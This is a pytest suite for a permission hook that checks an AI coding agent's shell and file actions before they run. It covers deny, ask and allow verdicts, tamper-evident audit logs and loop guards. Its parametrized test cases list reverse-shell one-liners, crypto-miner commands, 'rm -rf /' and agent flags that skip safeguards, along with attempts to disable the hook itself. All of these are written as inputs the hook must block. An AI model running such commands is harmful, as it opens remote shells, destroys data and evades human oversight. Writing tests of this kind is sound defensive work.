"""Round 3 battery (SHINE3): alias resolution, production signals,
self-protection, hash-chained audit, checkpoints, loop guard,
agent-bypass/exposure detectors, junction-aware blast radius."""

import importlib.util
import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
HOOK = ROOT / "hooks" / "seatbelt_hook.py"


def load_hook():
    spec = importlib.util.spec_from_file_location("seatbelt_hook", HOOK)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


hook = load_hook()


def drive(payload, cwd, env_extra=None):
    env = dict(os.environ)
    if env_extra:
        env.update(env_extra)
    proc = subprocess.run([sys.executable, str(HOOK)],
                          input=json.dumps(payload), capture_output=True,
                          text=True, cwd=str(cwd), env=env, timeout=20)
    assert proc.returncode == 0, proc.stderr
    return proc.stdout


def payload(command, cwd, session="r3", tool="Bash", tool_input=None):
    return {"hook_event_name": "PreToolUse", "session_id": session,
            "cwd": str(cwd), "tool_name": tool,
            "tool_input": tool_input or {"command": command}}


# ── U1: alias resolution ────────────────────────────────────────────

def _pkg(tmp_path, scripts):
    (tmp_path / "package.json").write_text(json.dumps({"scripts": scripts}))


def test_alias_dbpush_asks(tmp_path):
    _pkg(tmp_path, {"db:push": "prisma db push --accept-data-loss"})
    got = hook.evaluate_bash("npm run db:push", cwd=str(tmp_path))
    assert got["decision"] == "ask"
    assert "db:push" in got["reason"]


def test_alias_benign_test_allows(tmp_path):
    _pkg(tmp_path, {"test": "pytest -q"})
    assert hook.evaluate_bash("npm run test", cwd=str(tmp_path))["decision"] == "allow"


def test_alias_unknown_is_silence(tmp_path):
    _pkg(tmp_path, {"test": "pytest -q"})
    assert hook.evaluate_bash("npm run nope", cwd=str(tmp_path))["decision"] == "defer"
    _pkg(tmp_path, {"mystery": "unknown-tool --x"})
    assert hook.evaluate_bash("npm run mystery", cwd=str(tmp_path))["decision"] == "defer"


def test_make_and_just_fixtures(tmp_path):
    (tmp_path / "Makefile").write_text("clean:\n\trm -rf build\nbuild:\n\tgcc main.c\n")
    assert hook.evaluate_bash("make clean", cwd=str(tmp_path))["decision"] == "deny"
    assert hook.evaluate_bash("make build", cwd=str(tmp_path))["decision"] == "defer"
    (tmp_path / "justfile").write_text("wipe:\n    rm -rf dist\n")
    assert hook.evaluate_bash("just wipe", cwd=str(tmp_path))["decision"] == "deny"


# ── U2: production signals ──────────────────────────────────────────

DELETE = "psql -c \"DELETE FROM users WHERE id=1\""


def test_prod_signal_noted_in_solo(tmp_path):
    got = hook.evaluate_bash(
        "DATABASE_URL=postgres://db-prod.internal/app " + DELETE, cwd=str(tmp_path))
    assert got["decision"] == "ask"
    assert "PRODUCTION" in got["reason"]


def test_prod_signal_escalates_in_strict(tmp_path):
    got = hook.evaluate_bash(
        "DATABASE_URL=postgres://db-prod.internal/app " + DELETE,
        mode="strict", cwd=str(tmp_path))
    assert got["decision"] == "deny"


def test_staging_control_not_escalated(tmp_path):
    got = hook.evaluate_bash(DELETE + " --host staging-db", cwd=str(tmp_path))
    assert got["decision"] == "ask"
    assert "PRODUCTION" not in got["reason"]


def test_checkpoint_line_present(tmp_path):
    got = hook.evaluate_bash(DELETE, cwd=str(tmp_path))
    assert "Last checkpoint:" in got["reason"]


# ── U3: self-protection + governance ────────────────────────────────

def test_self_protection_denies(tmp_path):
    hook_file = str(HOOK)
    assert hook.evaluate_file("Write", hook_file, cwd=str(tmp_path))["decision"] == "deny"
    assert hook.evaluate_file(
        "Write", "/home/u/p/.seatbelt/policy.json", cwd=str(tmp_path))["decision"] == "deny"
    assert hook.evaluate_file(
        "Write", "/home/u/p/.seatbelt/audit.jsonl", cwd=str(tmp_path))["decision"] == "deny"
    assert hook.evaluate_bash("rm .seatbelt/audit.jsonl")["decision"] == "deny"
    assert hook.evaluate_bash("SEATBELT_MODE=audit claude")["decision"] == "deny"
    assert hook.evaluate_bash("unset SEATBELT_MODE")["decision"] == "deny"


def test_governance_asks_but_reads_are_open(tmp_path):
    assert hook.evaluate_file("Write", "/home/u/p/CLAUDE.md",
                              cwd=str(tmp_path))["decision"] == "ask"
    assert hook.evaluate_file("Read", "/home/u/p/.seatbelt/policy.json",
                              cwd=str(tmp_path))["decision"] == "allow"
    assert hook.evaluate_bash("cat .seatbelt/policy.json")["decision"] == "allow"


# ── U3: hash chain ──────────────────────────────────────────────────

def test_hash_chain_verifies_and_detects_tamper(tmp_path):
    drive(payload("git status", tmp_path), tmp_path)
    drive(payload("rm -rf /", tmp_path), tmp_path)
    buf = io_out = subprocess.run(
        [sys.executable, str(HOOK), "--verify-log"], capture_output=True,
        text=True, cwd=str(tmp_path))
    assert buf.returncode == 0 and "OK" in buf.stdout
    log = tmp_path / ".seatbelt" / "audit.jsonl"
    lines = log.read_text().splitlines()
    row = json.loads(lines[0])
    row["decision"] = "tampered-value"  # rewrite history
    lines[0] = json.dumps(row)
    log.write_text("\n".join(lines) + "\n")
    buf = subprocess.run([sys.executable, str(HOOK), "--verify-log"],
                         capture_output=True, text=True, cwd=str(tmp_path))
    assert buf.returncode == 1 and "line 1" in buf.stdout


def test_doctor_includes_chain(tmp_path):
    drive(payload("git status", tmp_path), tmp_path)
    proc = subprocess.run([sys.executable, str(HOOK), "--doctor"],
                          capture_output=True, text=True, cwd=str(tmp_path))
    assert "audit hash chain" in proc.stdout


# ── U4: checkpoints ─────────────────────────────────────────────────

def test_checkpoint_in_git_repo(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    subprocess.run(["git", "init", "-q"], cwd=repo)
    subprocess.run(["git", "config", "user.email", "t@t"], cwd=repo)
    subprocess.run(["git", "config", "user.name", "t"], cwd=repo)
    (repo / "a.txt").write_text("v1")
    subprocess.run(["git", "add", "."], cwd=repo)
    subprocess.run(["git", "commit", "-qm", "one"], cwd=repo)
    (repo / "a.txt").write_text("v2 dirty")
    proc = subprocess.run([sys.executable, str(HOOK), "--checkpoint"],
                          capture_output=True, text=True, cwd=str(repo))
    assert proc.returncode == 0 and "refs/seatbelt/" in proc.stdout
    refs = subprocess.run(["git", "for-each-ref", "refs/seatbelt"],
                          capture_output=True, text=True, cwd=repo).stdout
    assert "refs/seatbelt/" in refs
    assert (repo / "a.txt").read_text() == "v2 dirty"  # tree untouched


def test_session_summary_and_next_session_context(tmp_path):
    drive(payload("rm -rf /", tmp_path, session="sum1"), tmp_path)
    drive({"hook_event_name": "Stop", "session_id": "sum1",
           "cwd": str(tmp_path)}, tmp_path)
    summary = tmp_path / ".seatbelt" / "last-session.md"
    assert summary.exists() and "Blocked or asked: 1" in summary.read_text()
    out = drive({"hook_event_name": "SessionStart", "session_id": "sum2",
                 "cwd": str(tmp_path)}, tmp_path)
    assert "Last session" in out


# ── U5: loop guard ──────────────────────────────────────────────────

def test_loop_guard_trips_at_third_repeat(tmp_path):
    decisions = []
    for _ in range(3):
        out = drive(payload("cargo build --release", tmp_path,
                            session="loop1"), tmp_path)
        decisions.append("defer" if not out.strip() else
                         json.loads(out)["hookSpecificOutput"]["permissionDecision"])
    assert decisions[:2] == ["defer", "defer"]
    assert decisions[2] == "ask"


def test_loop_guard_never_softens_a_deny(tmp_path):
    # Regression (Round 8 battery): repeat #3 of `rm -rf /` used to
    # come back as a loop-guard ASK — the guard replaced the verdict
    # instead of competing with it. Strictest wins: deny stays deny.
    decisions = []
    for _ in range(4):
        out = drive(payload("rm -rf /", tmp_path, session="loopdeny"),
                    tmp_path)
        doc = json.loads(out)
        decisions.append(doc["hookSpecificOutput"]["permissionDecision"])
    assert decisions == ["deny", "deny", "deny", "deny"]


def test_loop_guard_exempts_safe_reads(tmp_path):
    for _ in range(4):
        out = drive(payload("git status", tmp_path, session="loop2"), tmp_path)
        assert json.loads(out)["hookSpecificOutput"]["permissionDecision"] == "allow"


# ── U6: bypass / shells / exposure ──────────────────────────────────

@pytest.mark.parametrize("cmd,expected", [
    ("claude --dangerously-skip-permissions", "deny"),
    ("codex --dangerously-bypass-approvals-and-sandbox", "deny"),
    ("bash -i >& /dev/tcp/10.0.0.1/4444", "deny"),
    ("nc -e /bin/sh host 4444", "deny"),
    ("socat exec:'bash -li' tcp:host:4444", "deny"),
    ("xmrig -o pool.example:3333", "deny"),
    ("curl -s stratum+tcp://pool.example:3333", "deny"),
    ("ngrok http 3000", "ask"),
    ("cloudflared tunnel --url http://localhost:3000", "ask"),
    ("ssh -R 80:localhost:3000 relay.example", "ask"),
    ("curl -k https://internal.example", "ask"),
    ("wget --no-check-certificate https://x.example/f", "ask"),
    ("NODE_TLS_REJECT_UNAUTHORIZED=0 node app.js", "ask"),
    ("prisma db push --accept-data-loss", "ask"),
])
def test_u6_verdicts(cmd, expected):
    assert hook.evaluate_bash(cmd)["decision"] == expected, cmd


def test_bare_agent_launch_strict_asks():
    assert hook.evaluate_bash("claude", mode="strict")["decision"] == "ask"
    assert hook.evaluate_bash("claude")["decision"] == "defer"


# ── U7: junction-aware blast radius ─────────────────────────────────

def test_junction_links_named_in_reason(tmp_path):
    (tmp_path / "outside").mkdir()
    (tmp_path / "outside" / "precious.txt").write_text("data")
    (tmp_path / "mirror").mkdir()
    (tmp_path / "mirror" / "live").symlink_to(tmp_path / "outside",
                                              target_is_directory=True)
    got = hook.evaluate_bash("find mirror -type f -delete", cwd=str(tmp_path))
    assert got["decision"] == "ask"
    assert "OUTSIDE" in got["reason"]


def test_link_following_code_asks(tmp_path):
    # os.walk + pathlib unlink: no single flagged verb, but the
    # recursion has no link guard — the 48k-file shape.
    got = hook.evaluate_file(
        "Write", "/home/u/p/clean.py",
        content=("import os\nfrom pathlib import Path\n"
                 "for root, dirs, files in os.walk('mirror'):\n"
                 "    for f in files:\n"
                 "        Path(root, f).unlink()\n"),
        cwd=str(tmp_path))
    assert got["decision"] == "ask"
    assert got["rule_id"].endswith("seatbelt-locked-code-link-following")
